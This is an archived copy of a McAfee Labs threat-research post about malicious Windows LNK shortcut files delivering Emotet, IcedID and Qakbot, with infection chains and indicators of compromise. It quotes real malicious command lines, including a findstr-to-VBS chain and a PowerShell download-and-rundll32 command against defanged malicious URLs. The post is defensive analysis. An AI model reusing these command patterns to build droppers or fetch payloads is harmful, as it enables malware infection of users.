{
    "id": "2e305029-fe06-4393-85c7-a97075ca113d",
    "created_at": "2023-01-12T15:10:24.415934Z",
    "updated_at": "2025-03-27T02:06:12.987422Z",
    "deleted_at": null,
    "sha1_hash": "b167f30ab4266239a51137334c109018a070b153",
    "title": "2022-06-21 - Rise of LNK (Shortcut files) Malware",
    "authors": "",
    "file_creation_date": "2022-07-18T18:05:59Z",
    "file_modification_date": "2022-07-18T18:05:59Z",
    "file_size": 2037234,
    "plain_text": "# Rise of LNK (Shortcut files) Malware\n\n**[mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/)**\n\n[McAfee Labs](https://www.mcafee.com/blogs/author/mcafee-labs/)\n\nJun 21, 2022\n\n6 MIN READ\n\nAuthored by Lakshya Mathur\n\n\nJune 21, 2022\n\n\nAn LNK file is a Windows Shortcut that serves as a pointer to open a file, folder, or application. LNK files are based on\nthe Shell Link binary file format, which holds information used to access another data object. These files can be created\nmanually using the standard right-click create shortcut option or sometimes they are created automatically while\nrunning an application. There are many tools also available to build LNK files, also many people have built “lnkbombs”\ntools specifically for malicious purposes.\n\nDuring the second quarter of 2022, McAfee Labs has seen a rise in malware being delivered using LNK files. Attackers\nare exploiting the ease of LNK, and are using it to deliver malware like Emotet, Qakbot, IcedID, Bazarloaders, etc.\n\n\n-----\n\nFigure 1 – Apr to\n\nMay month geolocation of the LNK attacks\nIn this blog, we will see how LNK files are being used to deliver malware such as Emotet, Qakbot, and IcedID.\n\nBelow is a screenshot of how these shortcut files look to a normal user.\n\nFigure 2 _ LNK files as seen by a normal user\n\n## LNK THREAT ANALYSIS & CAMPAIGNS\n\nWith [Microsoft disabling office macros by default malware actors are now enhancing their lure techniques including](https://docs.microsoft.com/en-us/deployoffice/security/internet-macros-blocked)\nexploiting LNK files to achieve their goals.\n\nThreat actors are using email spam and malicious URLs to deliver LNK files to victims. These files instruct legitimate\napplications like PowerShell, CMD, and MSHTA to download malicious files.\n\nWe will go through three recent malware campaigns Emotet, IcedID, and Qakbot to see how dangerous these files can\nbe.\n\n\n-----\n\n## EMOTET\n\n### Infection-Chain\n\nFigure 3 _Emotet delivered via LNK file Infection-Chain\n\n## Threat Analysis\n\n\n-----\n\nFigure 4 _ Email user received having malicious LNK attached\nIn Figure 4 we can see the lure message and attached malicious LNK file.\n\nThe user is infected by manually accessing the attached LNK file. To dig a little deeper, we see the properties of the\nLNK file:\n\n\n-----\n\nFigure 5 _Properties of Emotet LNK\n\nsample\nAs seen in Figure 5 the target part reveals that LNK invokes the Windows Command Processor (cmd.exe). The target\npath as seen in the properties is only visible to 255 characters. However, command-line arguments can be up to 4096,\nso malicious actors can that this advantage and pass on long arguments as they will be not visible in the properties.\n\nIn our case the argument is /v:on /c findstr “glKmfOKnQLYKnNs.*” “Form 04.25.2022, US.lnk” >\n“%tmp%\\YlScZcZKeP.vbs” & “%tmp%\\YlScZcZKeP.vbs”\n\nFigure 6 _ Contents of Emotet LNK file\nOnce the findstr.exe utility receives the mentioned string, the rest of the content of the LNK file is saved in a .VBS file\nunder the %temp% folder with the random name YIScZcZKeP.vbs\n\n\n-----\n\nThe next part of the cmd.exe command invokes the VBS file using the Windows Script Host (wscript.exe) to download\nthe main Emotet 64-bit DLL payload.\n\nThe downloaded DLL is then finally executed using the REGSVR32.EXE utility which is similar behavior to the\nexcel(.xls) based version of the emotet.\n\n## ICEDID\n\n### Infection-Chain\n\nFigure 7 _ IcedID delivered via LNK file Infection-Chain\n\n## Threat Analysis\n\nThis attack is a perfect example of how attackers chain LNK, PowerShell, and MSHTA utilities target their victims.\n\nHere, PowerShell LNK has a highly obfuscated parameter which can be seen in Figure 8 target part of the LNK\nproperties\n\n\n-----\n\nFigure 8 _ Properties of IcedID LNK\n\nsample\nThe parameter is exceptionally long and is not fully visible in the target part. The whole obfuscated argument is\ndecrypted at run-time and then executes MSHTA with argument hxxps://hectorcalle[.]com/093789.hta.\n\nThe downloaded HTA file invokes another PowerShell that has a similar obfuscated parameter, but this connects to Uri\nhxxps://hectorcalle[.]com/listbul.exe\n\nThe Uri downloads the IcedID installer 64-bit EXE payload under the %HOME% folder.\n\n## QAKBOT\n\n### Infection-Chain\n\n\n-----\n\nFigure 9 _ Qakbot delivered via LNK file Infection-Chain\n\n## Threat Analysis\n\nThis attack will show us how attackers can directly hardcode malicious URLs to run along with utilities like PowerShell\nand download main threat payloads.\n\nFigure 10 _ Properties of Qakbot LNK\n\nsample\n\n\n-----\n\nIn Figure 10 the full target part argument is C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe NoExit\niwr -Uri hxxps://news-wellness[.]com/5MVhfo8BnDub/D.png -OutFile $env:TEMP\\test.dll;Start-Process rundll32.exe\n$env:TEMP\\test.dll,jhbvygftr”\n\nWhen this PowerShell LNK is invoked, it connects to hxxps://news-wellness[.]com/5MVhfo8BnDub/D.png using the\nInvoke-WebRequest command and the download file is saved under the %temp% folder with the name test.dll\n\nThis is the main Qakbot DLL payload which is then executed using the rundll32 utility.\n\n## CONCLUSION\n\nAs we saw in the above three threat campaigns, it is understood that attackers abuse the windows shortcut LNK files\nand made them to be extremely dangerous to the common users. LNK combined with PowerShell, CMD, MSHTA, etc.,\ncan do severe damage to the victim’s machine. Malicious LNKs are generally seen to be using PowerShell and CMD\nby which they can connect to malicious URLs to download malicious payloads.\n\nWe covered just three of the threat families here, but these files have been seen using other windows utilities to deliver\ndiverse types of malicious payloads. These types of attacks are still evolving, so every user must give a thorough check\nwhile using LNK shortcut files. Consumers must keep their Operating system and Anti-Virus up to date. They should\nbeware of phishing mail and clicking on malicious links and attachments.\n\n## IOC (Indicators of Compromise)\n\n**Type** **SHA-256** **Scanner**\n\n\nEmotet\nLNK\n\nIcedID\nLNK\n\nQakbot\nLNK\n\nURLs\n(Uniform\nResource\nLocator)\n\n\n02eccb041972825d51b71e88450b094cf692b9f5f46f5101ab3f2210e2e1fe71 WSS LNK/EmotetFSE\n\n24ee20d7f254e1e327ecd755848b8b72cd5e6273cf434c3a520f780d5a098ac9 WSS LNK/AgentFTA\nSuspicious\nZIP!lnk\n\nb5d5464d4c2b231b11b594ce8500796f8946f1b3a10741593c7b872754c2b172 WSS LNK/AgentTSR\n\n\nhxxps://creemo[.]pl/wp-admin/ZKS1DcdquUT4Bb8Kb/\nhxxp://filmmogzivota[.]rs/SpryAssets/gDR/\n\nhxxp://demo34.ckg[.]hk/service/hhMZrfC7Mnm9JD/\n\nhxxp://focusmedica[.]in/fmlib/IxBABMh0I2cLM3qq1GVv/\n\nhxxp://cipro[.]mx/prensa/siZP69rBFmibDvuTP1/\n\nhxxps://hectorcalle[.]com/093789.hta\n\nhxxps://hectorcalle[.]com/listbul.exe\n\nhxxps://green-a-thon[.]com/LosZkUvr/B.png\n\n\nWebAdvisor All URLs\nBlocked\n\n\n[McAfee Labs\nThreat Research Team](https://www.mcafee.com/blogs/author/mcafee-labs/)\nMcAfee Labs is one of the leading sources for threat research, threat intelligence, and cybersecurity thought\nleadership. See our blog posts below for more information.\n\n### More from McAfee Labs\n\n\n-----\n\n[Instagram credentials Stealers: Free Followers or Free Likes](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/instagram-credentials-stealers-free-followers-or-free-likes/%20)\n\nAuthored by Dexter Shin Instagram has become a platform with over a billion monthly active users. Many...\n\nJun 10, 2022 |  6 MIN READ\n\n[Instagram credentials Stealer: Disguised as Mod App](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/instagram-credentials-stealer-disguised-as-mod-app/%20)\n\nAuthored by Dexter Shin McAfee’s Mobile Research Team introduced a new Android malware targeting Instagram\nusers who...\n\nJun 10, 2022 |  4 MIN READ\n\n[Phishing Campaigns featuring Ursnif Trojan on the Rise](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/phishing-campaigns-featuring-ursnif-trojan/%20)\n\nAuthored by Jyothi Naveen and Kiran Raj McAfee Labs have been observing a spike in phishing campaigns...\n\nJun 07, 2022 |  6 MIN READ\n\n[Crypto Scammers Exploit: Elon Musk Speaks on Cryptocurrency](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/crypto-scammers-exploit-elon-musk-speaks-on-cryptocurrency/%20)\n\nBy Oliver Devane Update: In the past 24 hours (from time of publication) McAfee has identified 15...\n\nMay 25, 2022 |  4 MIN READ\n\n\n-----\n\n[Scammers are Exploiting Ukraine Donations](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/scammers-are-exploiting-ukraine-donations/%20)\n\nAuthored by Vallabh Chole and Oliver Devane Scammers are very quick at reacting to current events, so...\n\nApr 01, 2022 |  7 MIN READ\n\n[Imposter Netflix Chrome Extension Dupes 100k Users](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/imposter-netflix-chrome-extension-dupes-100k-users/%20)\n\nAuthored by Oliver Devane, Vallabh Chole, and Aayush Tyagi McAfee has recently observed several malicious\nChrome Extensions...\n\nMar 10, 2022 |  8 MIN READ\n\n[Why Am I Getting All These Notifications on my Phone?](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/why-am-i-getting-all-these-notifications-on-my-phone/%20)\n\nAuthored by Oliver Devane and Vallabh Chole  Notifications on Chrome and Edge, both desktop browsers, are\ncommonplace,...\n\nFeb 25, 2022 |  5 MIN READ\n\n[Emotet’s Uncommon Approach of Masking IP Addresses](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/emotets-uncommon-approach-of-masking-ip-addresses/%20)\n\nIn a recent campaign of Emotet, McAfee Researchers observed a change in techniques. The Emotet maldoc was...\n\nFeb 04, 2022 |  4 MIN READ\n\n\n-----\n\n[HANCITOR DOC drops via CLIPBOARD](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/hancitor-doc-drops-via-clipboard/%20)\n\nHancitor, a loader that provides Malware as a Service, has been observed distributing malware such as\nFickerStealer,...\n\nDec 13, 2021 |  6 MIN READ\n\n[‘Tis the Season for Scams](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/tis-the-season-for-scams/%20)\n\n‘Tis the Season for Scams\n\nNov 29, 2021 |  18 MIN READ\n\n[The Newest Malicious Actor: “Squirrelwaffle” Malicious Doc.](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/the-newest-malicious-actor-squirrelwaffle-malicious-doc/%20)\n\nAuthored By Kiran Raj Due to their widespread use, Office Documents are commonly used by Malicious actors...\n\nNov 10, 2021 |  4 MIN READ\n\n[Social Network Account Stealers Hidden in Android Gaming Hacking Tool](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/social-networks-account-stealer-hidden-in-android-gaming-hacking-tool/%20)\n\nAuthored by: Wenfeng Yu McAfee Mobile Research team recently discovered a new piece of malware that\nspecifically...\n\nOct 19, 2021 |  6 MIN READ\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-21 - Rise of LNK (Shortcut files) Malware.pdf"
    ],
    "report_names": [
        "2022-06-21 - Rise of LNK (Shortcut files) Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536224,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1658167559,
    "ts_modification_date": 1658167559,
    "files": {
        "pdf": "https://archive.orkl.eu/b167f30ab4266239a51137334c109018a070b153.pdf",
        "text": "https://archive.orkl.eu/b167f30ab4266239a51137334c109018a070b153.txt",
        "img": "https://archive.orkl.eu/b167f30ab4266239a51137334c109018a070b153.jpg"
    }
}